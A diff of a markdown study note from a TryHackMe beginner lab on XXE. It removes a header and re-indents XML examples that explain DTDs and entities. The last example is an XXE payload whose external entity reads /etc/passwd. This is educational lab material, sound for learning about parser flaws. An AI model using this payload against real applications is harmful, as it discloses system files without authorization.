@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-12-09-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner (Supplements)
-
-**author:** Nathan Acks  
-**date:** 2021-12-09
-
 # XXE
 
 ## Deploy the VM
@@ -36,24 +31,24 @@ The Document Type Definition defines/validates an XML document. For example, the
 
 ```
 <!DOCTYPE note [
-<!ELEMENT note (to,from,heading,body)>
-<!ELEMENT to (#PCDATA)>
-<!ELEMENT from (#PCDATA)>
-<!ELEMENT heading (#PCDATA)>
-<!ELEMENT body (#PCDATA)>
+	<!ELEMENT note (to,from,heading,body)>
+	<!ELEMENT to (#PCDATA)>
+	<!ELEMENT from (#PCDATA)>
+	<!ELEMENT heading (#PCDATA)>
+	<!ELEMENT body (#PCDATA)>
 ]>
 ```
 
 validate the XML document
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE note SYSTEM "note.dtd">
-<note>
-<to>falcon</to>
-<from>feast</from>
-<heading>hacking</heading>
-<body>XXE attack</body>
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE note SYSTEM "note.dtd">  
+<note>  
+	<to>falcon</to>  
+	<from>feast</from>  
+	<heading>hacking</heading>  
+	<body>XXE attack</body>  
 </note>
 ```
 
@@ -63,11 +58,11 @@ The DTD can also define multiple ENTITY types - `&amp;` and similar.
 
 ```
 <!DOCTYPE userInfo [
-<!ENTITY name "feast">
+	<!ENTITY name "feast">
 ]>
 <userInfo>
-<firstName>falcon</firstName>
-<lastName>&name;</lastName>
+	<firstName>falcon</firstName>
+	<lastName>&name;</lastName>
 </userInfo>
 ```
 
@@ -80,7 +75,7 @@ These last two features are what we will leverage to attack applications that ac
 ```
 <?xml version="1.0"?>
 <!DOCTYPE root [
-<!ENTITY read SYSTEM 'file:///etc/passwd'>
+	<!ENTITY read SYSTEM 'file:///etc/passwd'>
 ]>
 <root>&read;</root>
 ```
